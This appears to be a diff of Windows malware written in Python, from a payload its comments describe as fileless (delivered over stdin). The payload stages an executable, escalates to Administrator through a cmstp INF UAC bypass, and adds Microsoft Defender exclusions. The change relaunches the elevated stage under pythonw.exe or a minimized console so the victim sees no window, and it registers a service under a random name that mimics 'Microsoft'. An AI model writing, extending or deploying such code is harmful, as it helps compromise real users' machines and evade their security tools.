@@ -1,4 +1,4 @@
- # tung python-road payload — silent on every failure, stdlib only.
+# tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe -> Administrator lift via cmstp (majanito shape)
@@ -448,13 +448,30 @@ def set_defender_exclusions():
             fh.write(stage_text)
     except Exception:
         return
-    python_exe = os.path.join(os.path.dirname(stage_path), "python312", "python.exe")
-    if not os.path.exists(python_exe):
-        python_exe = "python.exe"   # system python fallback (some boxes have it)
+    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
+    # interpreter python312\\python.exe — its console subsystem opened a black
+    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
+    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
+    # flash was purely this relaunch. Preference now:
+    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
+    #   2) python312\\python.exe via cmd start /min (minimized console flash)
+    #   3) system python.exe via cmd start /min
+    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
+    # whole elevated chain stays windowless.
+    python_dir = os.path.join(PERSIST_DIR, "python312")
+    pythonw_p = os.path.join(python_dir, "pythonw.exe")
+    pyexe_p = os.path.join(python_dir, "python.exe")
+    if os.path.exists(pythonw_p):
+        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
+    elif os.path.exists(pyexe_p):
+        launch = subprocess.list2cmdline(
+            ["cmd.exe", "/c", "start", "", "/min", pyexe_p, "-u", stage_path])
+    else:
+        launch = subprocess.list2cmdline(
+            ["cmd.exe", "/c", "start", "", "/min", "python.exe", "-u", stage_path])
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    launch = subprocess.list2cmdline([python_exe, "-u", stage_path])
     body = build_inf(launch, svc_name)
     # ground truth: the exact bytes cmstp sees, plus the stage script
     try:
